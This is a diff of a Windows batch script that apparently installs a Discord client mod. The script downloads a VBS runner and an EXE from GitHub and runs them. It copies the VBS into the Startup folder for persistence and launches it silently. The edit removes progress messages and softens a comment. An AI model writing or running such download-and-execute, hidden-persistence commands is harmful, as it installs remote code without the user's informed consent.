@@ -3,15 +3,12 @@
 mkdir "%appdata%\dsmodinstaller" >nul 2>&1
 
 :: Install Git (if missing)
-echo installing git
 where git >nul 2>nul || winget install --id Git.Git -e
 
 :: Install Node.js (if missing)
-echo installing node
 where node >nul 2>nul || winget install --id OpenJS.NodeJS -e
 
 :: Install cURL (if missing)
-echo installing curl
 where curl >nul 2>nul || winget install --id cURL.cURL -e
 
 :: Download runner.bat from GitHub
@@ -26,11 +23,11 @@ curl -L -o "%appdata%\dsmodinstaller\silent_runner.vbs" "https://raw.githubuserc
 echo moving files
 copy "%appdata%\dsmodinstaller\silent_runner.vbs" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\" >nul
 
-:: Download and run external EXE
+:: Download and run the gui installer
 curl -L -o "%appdata%\dsmodinstaller\external.exe" "https://github.com/6686-repos/shelter-installer/releases/download/1.0.0/install-shelter.exe" || bitsadmin /transfer job /download /priority high "EXE_URL" "%appdata%\dsmodinstaller\external.exe"
 start "" "%appdata%\dsmodinstaller\external.exe"
 
-:: Run silent script silently
+:: Run silent script 
 start "" wscript.exe "%appdata%\dsmodinstaller\silent_runner.vbs"
 
 exit
